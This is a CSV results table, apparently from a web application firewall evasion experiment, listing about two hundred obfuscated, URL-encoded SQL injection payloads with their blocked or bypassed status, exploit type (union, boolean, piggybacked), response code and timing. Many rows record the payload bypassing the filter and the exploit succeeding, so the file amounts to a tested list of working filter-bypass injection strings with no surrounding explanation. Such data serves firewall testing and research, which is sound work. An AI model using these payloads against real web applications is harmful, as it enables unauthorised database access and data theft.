Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code
0'<@=1.+||+!%0b{`if`+1}=1=+(!%0b1),Bypassed,No,None,Unknown,0.007,69.48,No,500
0%27<@=1+or%0bnot%0b{`if`+1}=1=%0b(not%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0181,70.23,No,200
0%27<@=1+||+not%0b{a+1}=1=%0b(0)%0bor,Bypassed,Yes,unionAtk,Unknown,0.0163,70.23,No,200
0%27<@=1.%0bor+!+{a%0b1}=1=%0b(!+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.01,70.23,No,200
0%27<@=.1+or%0b!%7efalse=+(!%0b{`if`%0b1}=1),Bypassed,Yes,unionAtk,booleanAtk,0.0265,70.23,No,200
0'<@=1+or+not+1=+(!%0b{x%0b(select+,Bypassed,No,None,Unknown,0.0184,70.23,No,500
0'<@=.1%0b||+!%7efalse=%0b(not+{`if`+1}=1),Bypassed,No,None,Unknown,0.0138,70.23,No,500
0%27<@!=.1+or+not+{x+(select%0b1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.0146,70.23,No,403
0%27<@=1%0bor+!+1=%0b(!+{`if`+1}=1),Bypassed,Yes,unionAtk,Unknown,0.0224,70.23,No,200
0'<@!=1%0bor+!+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0174,70.47,No,500
0'or+1<@%0b||+not+{x+(select+1)}=1=%0b(not,Blocked,No,None,Unknown,0.0118,71.05,No,403
0%27<@!=1.+||%0bnot%7e0=%0b(not%0b{x+(select+,Bypassed,Yes,unionAtk,Unknown,0.0206,71.11,No,200
0'<@=1%0bor%0bfalse=+(!%0b1)+or%27,Bypassed,No,None,booleanAtk,0.0074,71.11,No,500
0%27<@!=.1%0bor%0b!%7e0=+(!%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.015,71.11,No,200
0%27<@!=1.+or+not+{a+1}=1=+(!+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.012,71.11,No,200
0%27<@!=.1%0bor+!+true=+(!%0btrue)%23,Bypassed,Yes,unionAtk,piggyAtk,0.0204,71.11,No,200
0%27<@=1.+||+!%0b{x%0b(select+1)}=1=%0b(not+,Bypassed,Yes,unionAtk,Unknown,0.0136,71.11,No,200
0%27<@=.1%0bor+not+{x+(select+1)}=1=+(!+,Bypassed,Yes,unionAtk,Unknown,0.0136,71.11,No,200
0%27<@=1+||+not+{`if`+1}=1=+(!%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0129,71.11,No,200
0'<@!=1.%0b||+not+{a%0b1}=1=%0b(!~0),Bypassed,No,None,Unknown,0.0103,71.11,No,500
0'<@=1%0bor%0b!+{`if`%0b1}=1=%0b(!+{`if`%0b1}=1,Bypassed,No,None,Unknown,0.0187,71.11,No,500
0'<@!=1+or+false=+(not+{x+(select+1)}=1),Blocked,No,None,booleanAtk,0.0045,71.11,No,403
0'<@=.1+or+!+{x%0b(select%0b1)}=1=+(not%0b{x,Bypassed,No,None,Unknown,0.019,71.11,No,500
0'<@!=.1%0bor+!+{x%0b(select+1)}=1=%0b(!+{a,Bypassed,No,None,Unknown,0.0078,71.11,No,500
0'<@=.1+||%0bnot%0btrue=%0b(not+{x+(select+1)}=1,Blocked,No,None,Unknown,0.0136,71.11,No,403
0%27<@=1.+or+not+{x+(select%0b1)}=1=%0b(!%7efalse,Blocked,No,None,booleanAtk,0.0204,71.11,No,403
0%27<@=.1+or+not+1=%0b(not+{x%0b(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0145,71.11,No,200
0%27<@!=1+||+not%0b{x+(select+1)}=1=%0b(!~false,Bypassed,Yes,unionAtk,Unknown,0.0179,71.11,No,200
0'<@=1+||%0b!%0btrue=+(not%0b{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0098,71.11,No,403
0'<@!=1.%0b||+not+1%0bis+false+or',Bypassed,No,None,booleanAtk,0.014,71.11,No,500
0%27<@=1+||%0bnot+{x+(select+1)}=1=+(not+,Blocked,No,None,Unknown,0.0082,71.11,No,403
0%27<@!=1+||%0bfalse=+(not+{a%0b1}=1)+or,Bypassed,Yes,unionAtk,booleanAtk,0.0123,71.11,No,200
0%27<@!=1+or%0bnot+{x+(select+1)}=1=+(!%0b,Blocked,No,None,Unknown,0.0127,71.11,No,403
0%27<@=.1%0b||+{x+(select+1)}=1+like%0b{x+(select+1)}=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0237,71.11,No,200
0'<@!=1+||+not%0btrue=+(not%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0167,71.11,No,500
0'<@=.1%0b||%0bnot+{a+1}=1=+(not+true),Bypassed,No,None,Unknown,0.0171,71.11,No,500
0%27<@=1+||+not%0b{x%0b(select%0b1)}=1=+(!+{a,Bypassed,Yes,unionAtk,Unknown,0.0171,71.11,No,200
0'<@!=1+or+!+{a%0b1}=1=+(not%0b{x%0b,Bypassed,No,None,Unknown,0.0184,71.11,No,500
0'<@!=1.+||+!~0=+(!+{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0144,71.11,No,403
0'<@!=1.+or%0b!+{x+(select%0b1)}=1=%0b(not+{`if`,Blocked,No,None,Unknown,0.0167,71.11,No,403
0%27<@=1+or+not%0b{x%0b(select+1)}=1=+(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0124,71.11,No,200
0%27||%0b1<@%0bor+not%0b{x+(select+1)}=1=+(!,Blocked,No,None,Unknown,0.0121,71.11,No,403
0%27<@=.1+||%0bnot%0b{x+(select+1)}=1=+(not~false,Blocked,No,None,Unknown,0.0173,71.11,No,403
0'<@=1.+or+not+{a+1}=1=%0b(!+{x+(select,Bypassed,No,None,Unknown,0.014,71.11,No,500
0'<@=1.%0bor+!%0b1=+(not+{a+1}=1),Bypassed,No,None,Unknown,0.0112,71.11,No,500
0'<@!=1.+or+!%0b{`if`+1}=1=%0b(false)%0b||,Bypassed,No,None,booleanAtk,0.0174,71.11,No,500
0'<@!=.1%0b||%0b!%0b{x+(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0137,71.11,No,500
0%27<@=.1%0bor+!%0b{a%0b1}=1=%0b(!+{x%0b,Bypassed,Yes,unionAtk,Unknown,0.0187,71.11,No,200
0%27||+!@<@.+or+not+{a%0b1}=1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.013,71.11,No,200
0'<@=1%0b||+!+{`if`%0b1}=1=+(not+{x%0b,Bypassed,No,None,Unknown,0.0073,71.11,No,500
0'<@=.1%0b||+!+{x%0b(select+1)}=1=+(not~0,Bypassed,No,None,Unknown,0.0131,69.48,No,500
0'<@=1.+or+!+{x%0b(select%0b1)}=1=+(!+,Bypassed,No,None,Unknown,0.0089,70.23,No,500
0%27<@=1+or%0bnot+true=+(!%0btrue)--+,Bypassed,Yes,unionAtk,piggyAtk,0.012,70.23,No,200
0'<@!=1.+||%0b!+{`if`%0b1}=1=+(not%7efalse),Bypassed,No,None,Unknown,0.0121,70.23,No,500
0'<@!=.1%0b||+!%0b{x+(select%0b1)}=1=+(not%0b{a,Bypassed,No,None,Unknown,0.0102,70.23,No,500
0%27<@!=.1+||+not+{x%0b(select+1)}=1=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0187,70.23,No,200
0%27<@!=1.+||+!+{`if`+1}=1=+(!%7e0),Bypassed,Yes,unionAtk,Unknown,0.0114,70.23,No,200
0%27||+@<@.+||+{x+(select+1)}=1%0blike+{a+1}=1,Blocked,No,None,Unknown,0.0131,70.23,No,403
0'<@=1.+||+false=%0b(not+{a%0b1}=1)%0bor,Bypassed,No,None,booleanAtk,0.0088,70.23,No,500
0'<@=.1%0bor%0b!%0b{a+1}=1=%0b(not%0b{a+1}=1,Bypassed,No,None,Unknown,0.01,70.23,No,500
0'<@!=.1%0b||%0bfalse=+(not+{a+1}=1)+||,Bypassed,No,None,Unknown,0.0151,70.23,No,500
0'<@=1.+||%0bnot~false=+(!+true)%0bor,Blocked,No,None,booleanAtk,0.0045,70.23,No,403
0%27<@!=1%0bor+{x+(select%0b1)}=1%0blike+{`if`+1}=1%23,Bypassed,Yes,unionAtk,piggyAtk,0.0087,71.05,No,200
0'<@!=1+or%0bnot%0b{x+(select+1)}=1=+(!+,Blocked,No,None,Unknown,0.0115,71.11,No,403
0'<@!=1.+or+not%0b{x+(select+1)}=1=+(!+{x,Bypassed,No,None,Unknown,0.019,71.11,No,500
0%27<@=.1+||+not+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0102,71.11,No,200
0'<@!=1+or%0b{a%0b1}=1+like%0b{`if`+1}=1%0bor',Bypassed,No,None,Unknown,0.015,71.11,No,500
0%27or+@<@.+or%0bnot%0b{x+(select+1)}=1=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.0128,71.11,No,200
0'<@!=1.+or+not+{x%0b(select%0b1)}=1=+(!+{`if`,Bypassed,No,None,Unknown,0.0155,71.11,No,500
0%27<@!=1.%0b||+!+{`if`%0b1}=1=%0b(!%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0133,71.11,No,200
0%27<@!=1.%0bor%0bnot+{x+(select%0b1)}=1=+(!%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0181,71.11,No,200
0'<@=1+||+not%0b{x%0b(select+1)}=1=+(not+{a,Bypassed,No,None,Unknown,0.009,71.11,No,500
0%27<@!=.1%0b||+not%0b{x+(select+1)}=1=+(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0187,71.11,No,200
0%27<@=1+||%0bnot%0b{`if`+1}=1=%0b(!%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0179,71.11,No,200
0%27<@!=1.+or%0b!+true=%0b(not~0)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.014,71.11,No,200
0%27<@!=.1%0bor+!%0b{x+(select+1)}=1=%0b(!%0b{x,Bypassed,Yes,unionAtk,Unknown,0.009,71.11,No,200
0%27<@=1.%0b||+!+{x%0b(select%0b1)}=1=+(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0133,71.11,No,200
0'<@!=.1+||%0b!+{x+(select+1)}=1=+(not~,Blocked,No,None,Unknown,0.0059,71.11,No,403
0%27||%0b@<@.%0bor+not+{x+(select+1)}=1=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0116,71.11,No,200
0'<@!=1.+||+!+1=+(0)%0bor',Blocked,No,None,Unknown,0.0116,71.11,No,403
0%27<@=1.%0bor+!+{a%0b1}=1=+(!+{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0145,71.11,No,200
0'<@=1.+||%0bnot+{x%0b(select+1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0146,71.11,No,500
0%27<@=1%0b||+not+{`if`+1}=1=%0b(!+{a+,Bypassed,Yes,unionAtk,Unknown,0.0183,71.11,No,200
0%27<@!=1.+||+{x%0b(select+1)}=1+like%0b{x+(select%0b1)}=1%0b,Bypassed,Yes,unionAtk,Unknown,0.009,71.11,No,200
0'<@=1.%0bor+!+{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0181,71.11,No,500
0%27<@!=1.+or%0b!%0b{a%0b1}=1=+(not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0219,71.11,No,200
0'<@=1.+or%0bnot%0b{x+(select+1)}=1=+(!+{a,Blocked,No,None,Unknown,0.0061,71.11,No,403
0%27<@=.1%0b||+not%7e0=%0b(!%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0194,71.11,No,200
0'<@!=1.%0bor%0bnot+{x+(select%0b1)}=1=%0b(not+{`if`,Bypassed,No,None,Unknown,0.0155,71.11,No,500
0%27<@!=.1%0bor+not%7e0=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0107,71.11,No,200
0'<@=.1+or+not%0b{`if`+1}=1=+(!%0b{x%0b,Bypassed,No,None,Unknown,0.0245,71.11,No,500
0%27<@!=.1%0bor%0b!+{x+(select+1)}=1=+(!+{a,Bypassed,Yes,unionAtk,Unknown,0.0137,71.11,No,200
0%27<@!=1.%0bor%0b{a+1}=1+like%0b{x+(select+1)}=1+||%27,Bypassed,Yes,unionAtk,Unknown,0.0199,71.11,No,200
0%27<@!=.1+or%0bnot%0b{a%0b1}=1=%0b(not+{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0119,71.11,No,200
0%27<@!=1+or%0bnot+{x+(select%0b1)}=1=+(false),Blocked,No,None,booleanAtk,0.0032,71.11,No,403
0'<@=.1+or+not+{x+(select+1)}=1=%0b(not+{x,Blocked,No,None,Unknown,0.0112,71.11,No,403
0%27<@=1+or+not+{x+(select%0b1)}=1=%0b(not%0b,Blocked,No,None,Unknown,0.0082,71.11,No,403
0'<@!=1+or+!+true=+(not~false)%0bor,Blocked,No,None,booleanAtk,0.0113,71.11,No,403
0'<@=1.%0b||+!%7efalse=%0b(not~false)%0bor,Bypassed,No,None,booleanAtk,0.0145,71.11,No,500
0%27or+@<@.%0bor+!+{x%0b(select%0b1)}=1=%0b(!,Bypassed,Yes,unionAtk,Unknown,0.0194,71.11,No,200
0'<@!=1.+or+!+true=+(!%7e0)+or,Bypassed,No,None,booleanAtk,0.0147,69.74,No,500
0'<@=1+||%0b{a+1}=1+like+true%0b||',Blocked,No,None,Unknown,0.0067,70.23,No,403
0%27<@=1.%0bor+not%0b{x+(select+1)}=1=%0b(!+,Bypassed,Yes,unionAtk,Unknown,0.0144,70.23,No,200
0'<@=1+||%0bnot%0b1=%0b(not%0b{x+(select+1)}=1,Bypassed,No,None,Unknown,0.0187,70.23,No,500
0%27<@=.1%0b||+not+{`if`+1}=1=+(not+1),Bypassed,Yes,unionAtk,Unknown,0.0184,70.23,No,200
0%27<@!=.1%0bor+not%7efalse=+(not%0b{x+(select+1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0184,70.23,No,200
0%27<@=1+or+!%7efalse=+(false)+or',Bypassed,No,None,booleanAtk,0.0179,70.23,No,500
0%27<@=1+||+false=+(!~0)--+,Blocked,No,None,piggyAtk,0.0105,70.23,No,403
0%27<@=1.+||+not%0b{`if`+1}=1=%0b(!+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0141,70.23,No,200
0%27<@!=1%0b||+not%7efalse=%0b(not+{`if`%0b1}=1),Bypassed,Yes,unionAtk,Unknown,0.0265,70.23,No,200
0%27<@=1.%0bor%0bnot+1=%0b(not%0b{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,Unknown,0.0102,70.23,No,200
0%27<@=.1+or%0b!%0b{`if`%0b1}=1=%0b(not+{x+,Bypassed,Yes,unionAtk,Unknown,0.0169,70.61,No,200
0%27<@!=1.%0bor%0bnot+{a%0b1}=1=+(not%0b1),Bypassed,Yes,unionAtk,Unknown,0.0102,70.99,No,200
0'<@=1.%0b||%0b!+{x+(select+1)}=1=+(!+,Bypassed,No,None,Unknown,0.0212,71.11,No,500
0%27<@!=.1+||+not%0b{x+(select%0b1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0109,71.11,No,200
0'<@!=1.+or%0b!%0b{x+(select%0b1)}=1=+(not%0b{x,Blocked,No,None,Unknown,0.0107,71.11,No,403
0'<@!=.1+||+not%0b1=+(not+1)--%0b,Blocked,No,None,piggyAtk,0.0141,71.11,No,403
0%27<@!=.1+or+not+{x+(select%0b1)}=1=%0b(not%0b{x,Blocked,No,None,Unknown,0.0035,71.11,No,403
0'||%0b@<@.%0b||+not+{x%0b(select%0b1)}=1=%0b(!,Bypassed,No,None,Unknown,0.0094,71.11,No,500
0'<@!=1.+||+false=%0b(not+{x%0b(select%0b1)}=1),Bypassed,No,None,Unknown,0.0136,71.11,No,500
0'<@!=1.+||%0b!+{`if`+1}=1=+(!+{x+(select,Bypassed,No,None,Unknown,0.0117,71.11,No,500
0'<@!=.1%0bor+not+{`if`+1}=1=%0b(not+{a%0b1}=1,Bypassed,No,None,Unknown,0.0176,71.11,No,500
0'<@!=1.+or%0b!+{`if`+1}=1=%0b(!%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.0119,71.11,No,500
0'<@!=1+or+not%0b{x+(select+1)}=1=+(!+1,Bypassed,No,None,Unknown,0.0169,71.11,No,500
0%27<@!=.1%0bor+!%7e0=+(not%7efalse)%0b||,Bypassed,Yes,unionAtk,booleanAtk,0.0209,71.11,No,200
0'<@=1%0b||+{a+1}=1+like%0b{x%0b(select%0b1)}=1--%0b,Bypassed,No,None,piggyAtk,0.0141,71.11,No,500
0'<@!=1+||+not%7efalse=+(not+{a+1}=1),Bypassed,No,None,Unknown,0.0146,71.11,No,500
0%27<@=1.+||+not+{`if`%0b1}=1=%0b(not+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0101,71.11,No,200
0'<@=1.+or+{a+1}=1%0blike%0b{a%0b1}=1+||%27,Bypassed,No,None,Unknown,0.0171,71.11,No,500
0'<@!=1.+or+!%0b{x%0b(select%0b1)}=1=+(not~false,Bypassed,No,None,booleanAtk,0.0233,71.11,No,500
0%27<@=.1+or+!%7efalse=%0b(not+{x+(select%0b1)}=1,Bypassed,Yes,unionAtk,booleanAtk,0.0186,71.11,No,200
0%27||%0b!@<@.%0bor+!%0b{x+(select%0b1)}=1=%0b(not,Bypassed,Yes,unionAtk,Unknown,0.0166,71.11,No,200
0%27<@=.1%0bor+not+{x%0b(select+1)}=1=%0b(!+{x,Bypassed,Yes,unionAtk,Unknown,0.0106,71.11,No,200
0'<@!=1.+||+not+true=+(not+{a+1}=1),Blocked,No,None,Unknown,0.009,71.11,No,403
0'<@!=1%0bor+!+{x%0b(select%0b1)}=1=%0b(not+,Bypassed,No,None,Unknown,0.0064,71.11,No,500
0%27<@=.1+||+not+{x%0b(select+1)}=1=%0b(not%0b{x,Bypassed,Yes,unionAtk,Unknown,0.0091,71.11,No,200
0%27<@=1+||%0bnot+{`if`%0b1}=1=+(not%7e0),Bypassed,Yes,unionAtk,Unknown,0.0118,71.11,No,200
0'<@!=1.%0bor%0bnot%0b{x+(select+1)}=1=%0b(0),Bypassed,No,None,Unknown,0.0125,71.11,No,500
0%27<@!=1.+||+not+{x+(select+1)}=1=+(!%0b{x,Blocked,No,None,Unknown,0.01,71.11,No,403
0'<@=.1+or%0bnot%0b{a%0b1}=1=+(not+{`if`+,Bypassed,No,None,Unknown,0.0141,71.11,No,500
0%27<@!=1%0bor%0b!+{x%0b(select+1)}=1=+(not+,Bypassed,Yes,unionAtk,Unknown,0.0085,71.11,No,200
0'<@=1.%0b||+not+{x+(select+1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0193,71.11,No,500
0%27<@!=.1+||%0b!%0b{x+(select+1)}=1=%0b(!+,Blocked,No,None,Unknown,0.0088,71.11,No,403
0%27<@!=1%0bor+!+{x+(select+1)}=1=%0b(!%0b,Bypassed,Yes,unionAtk,Unknown,0.011,71.11,No,200
0%27<@!=.1+||+not+{x+(select+1)}=1=%0b(not~false,Blocked,No,None,Unknown,0.0107,71.11,No,403
0'<@!=1.+or+not+1=+(not+{x%0b(select%0b1)}=1,Bypassed,No,None,Unknown,0.0118,71.11,No,500
0'<@!=1.+||+!+{`if`%0b1}=1=%0b(!%0b{`if`+1}=1,Bypassed,No,None,Unknown,0.017,71.11,No,500
0%27<@!=1+||%0bnot+{x+(select+1)}=1=%0b(!%0b{a,Blocked,No,None,Unknown,0.0076,71.11,No,403
0%27<@!=1+||+not%0b{x+(select+1)}=1=+(not%0b{`if`,Bypassed,Yes,unionAtk,Unknown,0.0079,71.11,No,200
0'<@=1+||+not+{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0099,71.11,No,500
0'<@!=.1%0bor%0bnot%7efalse=%0b(!%0b{x+(select%0b1)}=1,Bypassed,No,None,booleanAtk,0.0213,69.83,No,500
0'<@!=1.%0bor+false=%0b(!+{x+(select%0b1)}=1),Bypassed,No,None,booleanAtk,0.0163,70.23,No,500
0%27<@=1+||%0b!%0b{a%0b1}=1=+(!+{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0112,70.23,No,200
0'<@=1%0bor+not+{a%0b1}=1=%0b(not+true),Bypassed,No,None,booleanAtk,0.0135,70.23,No,500
0%27<@!=1.%0bor+!%7efalse=%0b(0)+||%27,Bypassed,Yes,unionAtk,booleanAtk,0.0229,70.23,No,200
0%27<@!=1+||+{a%0b1}=1+like+{x+(select+1)}=1%0bor',Blocked,No,None,Unknown,0.0103,70.23,No,403
0'<@!=.1%0b||+!+{x%0b(select%0b1)}=1=%0b(not+{x,Bypassed,No,None,Unknown,0.0164,70.23,No,500
0'<@=1.+||%0b!+1=+(not%0btrue)%23,Bypassed,No,None,piggyAtk,0.0174,70.23,No,500
0%27<@=.1+or%0bnot+{x+(select%0b1)}=1=%0b(!+,Blocked,No,None,Unknown,0.0072,70.23,No,403
0%27<@=1+||%0bnot%0b{a+1}=1=+(not%0b1),Bypassed,Yes,unionAtk,Unknown,0.0174,70.23,No,200
0'<@=1.+or+not%0btrue=%0b(!%0b{x%0b(select%0b1)}=1,Bypassed,No,None,booleanAtk,0.0147,70.47,No,500
0'<@!=1+||%0b!+{`if`+1}=1=%0b(not+true),Bypassed,No,None,Unknown,0.009,70.99,No,500
0%27<@!=.1+or+!%0b{a%0b1}=1=%0b(!%0b{x%0b(select,Bypassed,Yes,unionAtk,Unknown,0.0105,71.11,No,200
0%27<@!=.1+||+false=+(not%0b{x+(select+1)}=1),Bypassed,Yes,unionAtk,Unknown,0.0176,71.11,No,200
0%27<@!=1+or+not+{`if`+1}=1=+(!%0b{`if`%0b1}=1,Bypassed,Yes,unionAtk,Unknown,0.0101,71.11,No,200
0%27<@!=1+||%0bnot%0b{a+1}=1=+(!+{`if`+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0111,71.11,No,200
0%27<@=1.+||%0b!%0b{a%0b1}=1=%0b(not%0b{a+1}=1,Bypassed,Yes,unionAtk,Unknown,0.0123,71.11,No,200
0'<@=1.%0bor%0bfalse=+(not+{a+1}=1)+or,Bypassed,No,None,booleanAtk,0.0115,71.11,No,500
0%27<@=1.+or%0bnot+{x%0b(select+1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0087,71.11,No,200
0%27<@!=1.%0b||+!%0b1=%0b(0)--%0b,Bypassed,Yes,unionAtk,piggyAtk,0.0105,71.11,No,200
0'<@!=1+||%0bnot%0b{a+1}=1=+(!+1),Blocked,No,None,Unknown,0.0149,71.11,No,403
0%27<@!=.1%0bor%0bnot%0b{x%0b(select%0b1)}=1=%0b(0),Bypassed,Yes,unionAtk,Unknown,0.0191,71.11,No,200
0'<@!=.1%0bor+!+{`if`%0b1}=1=%0b(not+{x+(select,Bypassed,No,None,Unknown,0.0133,71.11,No,500
0'<@=1%0bor+!~0=%0b(not%0b{x%0b(select+,Bypassed,No,None,Unknown,0.0157,71.11,No,500
0'<@!=.1%0bor+!%0b{a+1}=1=%0b(false)+or,Bypassed,No,None,booleanAtk,0.0142,71.11,No,500
0%27<@!=.1%0bor+{x%0b(select+1)}=1+like+{x+(select+1)}=1%0b,Bypassed,Yes,unionAtk,Unknown,0.0144,71.11,No,200
0%27or+@<@.+||+not%0b{`if`+1}=1=+(not%0b,Bypassed,Yes,unionAtk,Unknown,0.0177,71.11,No,200
0'<@!=.1%0b||%0b!+{x+(select+1)}=1=+(!+{a,Bypassed,No,None,Unknown,0.0107,71.11,No,500
0%27<@!=1.+or%0bnot+true=+(not+{x+(select+,Blocked,No,None,booleanAtk,0.0205,71.11,No,403
0%27<@!=1.+or+!+{`if`+1}=1=%0b(!%0b{x+(select,Bypassed,Yes,unionAtk,Unknown,0.0142,71.11,No,200
0%27<@=1.+||+not%0b{x%0b(select+1)}=1=%0b(!~0,Bypassed,Yes,unionAtk,Unknown,0.0182,71.11,No,200
0%27<@=1%0b||%0bnot%0b{x%0b(select+1)}=1=+(not+{x,Bypassed,Yes,unionAtk,Unknown,0.0129,71.11,No,200
0%27<@!=1%0bor+not+{`if`%0b1}=1%0bis%0bfalse%0bor',Bypassed,No,None,booleanAtk,0.0175,71.11,No,500
